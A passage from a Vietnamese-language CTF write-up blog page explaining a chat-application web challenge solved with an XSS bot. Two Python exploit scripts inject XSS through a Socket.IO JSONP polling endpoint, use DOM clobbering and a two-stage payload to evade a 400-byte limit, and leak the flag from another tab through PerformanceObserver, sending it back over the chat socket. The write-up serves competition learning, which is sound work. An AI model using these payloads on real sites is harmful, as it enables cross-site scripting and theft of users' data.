</span></span><span class="line"><span class="cl">        <span class="s1">&#39;sid&#39;</span><span class="p">:</span> <span class="n">socket_session</span><span class="p">[</span><span class="s1">&#39;sid&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;40&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">socket_session</span><span class="p">[</span><span class="s1">&#39;sid&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">bot_session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">login</span> <span class="o">=</span> <span class="n">bot_session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/&#39;</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;FizzBuzz101&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">login</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">,</span> <span class="n">login</span><span class="o">.</span><span class="n">status_code</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sio</span> <span class="o">=</span> <span class="n">socketio</span><span class="o">.</span><span class="n">Client</span><span class="p">(</span><span class="n">http_session</span><span class="o">=</span><span class="n">bot_session</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ready</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@sio.event</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">connect</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">ready</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;connected!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># fake disconnect event so that the bot can connect as well</span>
</span></span><span class="line"><span class="cl">    <span class="n">sio</span><span class="o">.</span><span class="n">emit</span><span class="p">(</span><span class="s1">&#39;disconnect&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ready</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;ready for bot!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@sio.event</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">message</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">ready</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">ready</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;FizzBuzz101 joined.&#39;</span><span class="p">:</span> <span class="c1"># XSS bot opened the chat</span>
</span></span><span class="line"><span class="cl">        <span class="n">sid</span> <span class="o">=</span> <span class="n">create_sid</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">jsonp_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/socket.io/?EIO=4&amp;transport=polling&amp;t=bingus&amp;sid=</span><span class="si">{</span><span class="n">sid</span><span class="si">}</span><span class="s1">&amp;j=0&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">js_payload</span> <span class="o">=</span> <span class="s2">&#34;(alert(origin))&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">sio</span><span class="o">.</span><span class="n">emit</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#34;+&#39;</span><span class="o">+</span><span class="n">js_payload</span><span class="o">+</span><span class="s1">&#39;);//&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">xss_payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;a id=&amp;quot;___eio&amp;quot;&gt;&lt;/a&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;script src=&amp;quot;</span><span class="si">%s</span><span class="s2">&amp;quot;&gt;&lt;/script&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span> <span class="o">%</span> <span class="n">jsonp_url</span>
</span></span><span class="line"><span class="cl">        <span class="n">chat_message</span> <span class="o">=</span> <span class="s1">&#39;&lt;iframe id=&#34;xss&#34; srcdoc=&#34;</span><span class="si">%s</span><span class="s1">&#34;&gt;&lt;/iframe&gt;&#39;</span> <span class="o">%</span> <span class="n">xss_payload</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">sio</span><span class="o">.</span><span class="n">emit</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="n">chat_message</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sio</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">base_url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sio</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
</span></span></code></pre></div><p>trước khi emit lần 2, ta wrap payload vào trong <code>srcdoc</code> của iframe để tag <code>script</code> có thể chạy, đối với dòng <code>&lt;a id=&amp;quot;___eio&amp;quot;&gt;&lt;/a&gt;</code> thì mục đích là để thông qua DOM clobbering khởi tạo biến <code>__eio</code> để khi chạy payload sẽ không bị báo lỗi vì lúc này <code>__eio</code> chưa được khai báo (smart :O)</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/9b7f7a1a-d627-47bc-a539-78649cadbfa2" alt="image" />
    
  </figure>
</p>


<h3 class="relative group">Leaking flag with PerformanceObserver 
    <div id="leaking-flag-with-performanceobserver" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#leaking-flag-with-performanceobserver" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Trong giải mình có attemp bài này và hướng của mình là thông qua CSS để để leak flag, do đó mà mình đọc spec cũng như source chromium thì mình có tìm ra được là có một CSS combinator gọi là <code>/deep/</code> có khả năng chọc xuyên Shadow DOM, nhưng từ sớm đã bị deprecated và removed khỏi google chrome, shame. Quay trở lại bài, original solution của <code>Trixter</code> đã split XSS thành 2 stage để bypass qua giới hạn độ dài payload 400 bytes, stage 1 thực hiện <code>open('', 'secret')</code> để lấy reference đến tab <code>secret</code> chứa flag, tiếp theo là tiếp tục include script của stage 2. Ở stage 2 thì <code>Trixter</code> sử dụng một API là <code>PerformanceObserver</code> để để leak flag thông qua việc truy xuất vào url của các resource entry</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/50d32afd-7ed6-4c5d-a75c-325bbcd3c766" alt="image" />
    
  </figure>
</p>
<p>API này cho phép ta truy cập vào tất cả các resource đã load cũng như các thông số về performance khi load của resource đó (quite powerful), full script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socketio</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:8080&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_sid</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">login</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/&#39;</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{},</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">login</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">,</span> <span class="n">login</span><span class="o">.</span><span class="n">status_code</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/socket.io/&#39;</span><span class="p">,</span> <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;EIO&#39;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;transport&#39;</span><span class="p">:</span> <span class="s1">&#39;polling&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;t&#39;</span><span class="p">:</span> <span class="s1">&#39;bingus&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">socket_session</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;fake session&#39;</span><span class="p">,</span> <span class="n">socket_session</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/socket.io/&#39;</span><span class="p">,</span> <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;EIO&#39;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;transport&#39;</span><span class="p">:</span> <span class="s1">&#39;polling&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;t&#39;</span><span class="p">:</span> <span class="s1">&#39;P3qHGUZ&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;sid&#39;</span><span class="p">:</span> <span class="n">socket_session</span><span class="p">[</span><span class="s1">&#39;sid&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;40&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">socket_session</span><span class="p">[</span><span class="s1">&#39;sid&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">bot_session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">login</span> <span class="o">=</span> <span class="n">bot_session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/&#39;</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;FizzBuzz101&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">login</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">,</span> <span class="n">login</span><span class="o">.</span><span class="n">status_code</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sio</span> <span class="o">=</span> <span class="n">socketio</span><span class="o">.</span><span class="n">Client</span><span class="p">(</span><span class="n">http_session</span><span class="o">=</span><span class="n">bot_session</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ready</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@sio.event</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">connect</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">ready</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;connected!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># fake disconnect event so that the bot can connect as well</span>
</span></span><span class="line"><span class="cl">    <span class="n">sio</span><span class="o">.</span><span class="n">emit</span><span class="p">(</span><span class="s1">&#39;disconnect&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ready</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;ready for bot!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@sio.event</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">message</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">ready</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">ready</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;FizzBuzz101 joined.&#39;</span><span class="p">:</span> <span class="c1"># XSS bot opened the chat</span>
</span></span><span class="line"><span class="cl">        <span class="n">first_sid</span> <span class="o">=</span> <span class="n">create_sid</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">js_payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">(window.exfil = data =&gt; window.top.opener.top.socket.emit(&#39;message&#39;, data))
</span></span></span><span class="line"><span class="cl"><span class="s2">(window.observer = new parent.PerformanceObserver((list) =&gt; { list.getEntries().forEach((entry) =&gt; { window.exfil(&#39;Flag: &#39; + decodeURIComponent(entry.name.split(&#39;/&#39;).pop())); }); }))
</span></span></span><span class="line"><span class="cl"><span class="s2">(window.observer.observe({ type: &#39;resource&#39;, buffered: true }))
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;,&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">sio</span><span class="o">.</span><span class="n">emit</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#34;+&#39;</span><span class="o">+</span><span class="n">js_payload</span><span class="o">+</span><span class="s1">&#39;);//&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">second_sid</span> <span class="o">=</span> <span class="n">create_sid</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">jsonp_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/socket.io/?EIO=4&amp;transport=polling&amp;t=bingus&amp;sid=</span><span class="si">{</span><span class="n">second_sid</span><span class="si">}</span><span class="s1">&amp;j=0&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">js_payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">(window.secret=window.open(&#39;&#39;,&#39;secret&#39;))
</span></span></span><span class="line"><span class="cl"><span class="s2">(window.a=window.top.document.getElementById(&#39;xss&#39;).cloneNode())
</span></span></span><span class="line"><span class="cl"><span class="s2">(window.a.srcdoc=window.a.srcdoc.replace(&#39;</span><span class="si">%s</span><span class="s2">&#39;,&#39;</span><span class="si">%s</span><span class="s2">&#39;))
</span></span></span><span class="line"><span class="cl"><span class="s2">(window.secret.document.body.appendChild(window.a))
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;,&#39;</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="n">second_sid</span><span class="p">,</span> <span class="n">first_sid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">sio</span><span class="o">.</span><span class="n">emit</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#34;+&#39;</span><span class="o">+</span><span class="n">js_payload</span><span class="o">+</span><span class="s1">&#39;);//&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">xss_payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;a id=&amp;quot;___eio&amp;quot;&gt;&lt;/a&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;a id=&amp;quot;___eio&amp;quot;&gt;&lt;/a&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;script src=&amp;quot;</span><span class="si">%s</span><span class="s2">&amp;quot;&gt;&lt;/script&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span> <span class="o">%</span> <span class="n">jsonp_url</span>
</span></span><span class="line"><span class="cl">        <span class="n">chat_message</span> <span class="o">=</span> <span class="s1">&#39;&lt;iframe id=&#34;xss&#34; srcdoc=&#34;</span><span class="si">%s</span><span class="s1">&#34;&gt;&lt;/iframe&gt;&#39;</span> <span class="o">%</span> <span class="n">xss_payload</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">chat_message</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">400</span><span class="p">,</span> <span class="s1">&#39;chat message too long, time to write better payload&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">sio</span><span class="o">.</span><span class="n">emit</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="n">chat_message</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sio</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">base_url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sio</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
</span></span></code></pre></div><p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/d947da00-c9e4-4d52-b86e-1b34f37c8a77" alt="image" />
    
  </figure>
</p>


<h2 class="relative group">repayment-pal (PENDING) 
    <div id="repayment-pal-pending" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#repayment-pal-pending" aria-label="Anchor">#</a>
    </span>        
    
</h2>

          
          
          
        </div>
        
        

        
        

        


<h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
<section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
  
  

  <a href="/posts/googlectf/" class="min-w-full">
    
    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
        
        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/googlectf/features.png);"></div>
        
      

      <div class="px-6 py-4">

        
        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
          href="/posts/googlectf/">GoogleCTF 2024</div>
        

        <div class="text-sm text-neutral-500 dark:text-neutral-400">
          











  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-06-25T00:00:00&#43;00:00">25 June 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">21 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/shin24/&#34;,'_self');return false;">Shin24</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
  </span>
  
  
  
  
</div>




        </div>

        
      </div>
      <div class="px-6 pt-4 pb-2">

      </div>
    </div>
  </a>

  
  

  <a href="/posts/cr3-2024/" class="min-w-full">
    
    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
        
        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/cr3-2024/featurecr3.png);"></div>
        
      

      <div class="px-6 py-4">

        
        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
          href="/posts/cr3-2024/">CR3 CTF 2024</div>
        

        <div class="text-sm text-neutral-500 dark:text-neutral-400">
          











  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-05-03T00:00:00&#43;00:00">3 May 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">15 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/shin24/&#34;,'_self');return false;">Shin24</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
  </span>
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/reverse/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Reverse
  </span>
</span>
  </span>
  
  
  
  
</div>




        </div>

        
      </div>
      <div class="px-6 pt-4 pb-2">

      </div>
    </div>
  </a>

  
  

  <a href="/posts/imaginaryctf-2024/" class="min-w-full">
    
    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
        
        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/imaginaryctf-2024/feature-i.png);"></div>
        
      

      <div class="px-6 py-4">

        
        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
          href="/posts/imaginaryctf-2024/">ImaginaryCTF 2024</div>
        

        <div class="text-sm text-neutral-500 dark:text-neutral-400">
          











  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-04-27T00:00:00&#43;00:00">27 April 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/shin24/&#34;,'_self');return false;">Shin24</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
  </span>
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/misc/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Misc
  </span>
</span>
  </span>
  
  
  
  
</div>




        </div>

        
      </div>
      <div class="px-6 pt-4 pb-2">

      </div>
    </div>
  </a>

